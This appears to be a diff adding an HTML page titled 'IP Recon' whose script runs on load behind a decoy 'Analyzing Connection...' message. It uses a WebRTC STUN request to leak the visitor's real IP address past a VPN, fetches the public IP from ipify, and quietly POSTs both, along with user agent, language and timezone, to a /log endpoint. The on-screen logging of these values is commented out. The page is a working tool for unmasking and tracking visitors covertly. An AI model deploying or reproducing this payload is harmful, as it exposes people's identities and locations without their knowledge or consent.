@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>IP Recon</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #00ffcc;
+      font-family: monospace;
+      padding: 2em;
+    }
+    h1 { color: #ff00cc; }
+    pre { background: #222; padding: 1em; border-radius: 8px; }
+  </style>
+</head>
+<body>
+  <h1>Analyzing Connection...</h1>
+  <pre id="log">Loading...</pre>
+
+  <script>
+  (async function(){
+    const log = (msg) => document.getElementById('log').innerText += msg + "\n";
+    document.getElementById('log').innerText = "";
+
+    const userAgent = navigator.userAgent;
+    const lang = navigator.language;
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    //log(`User Agent: ${userAgent}`);
+    //log(`Language: ${lang}`);
+    //log(`Timezone: ${tz}`);
+
+    // === WebRTC Leak
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+      pc.createDataChannel("x");
+      pc.onicecandidate = (e) => {
+        if (!e.candidate) return;
+        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+        if (ip) {
+          const realIP = ip[1];
+          //log(`[WebRTC] Real IP: ${realIP}`);
+          sendData(realIP, "REAL_IP");
+        }
+      };
+      const offer = await pc.createOffer();
+      await pc.setLocalDescription(offer);
+    } catch (err) {
+      log(`[!] WebRTC Error: ${err}`);
+    }
+
+    // === Public IP as fallback (still VPN IP if used)
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const json = await res.json();
+      //log(`[IPify] Public IP: ${json.ip}`);
+      sendData(json.ip, "VPN_IP");
+    } catch (e) {
+      log("[!] IPify failed");
+    }
+
+    // === Logging Function (send data to backend)
+    function sendData(ip, source) {
+      fetch("/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          ip: ip,
+          source: source,
+          user_agent: userAgent,
+          language: lang,
+          timezone: tz
+        })
+      }).then(() => log(`THANKS ME VIA STAR ON GITHUB`));
+    }
+  })();
+  </script>
+</body>
+</html>
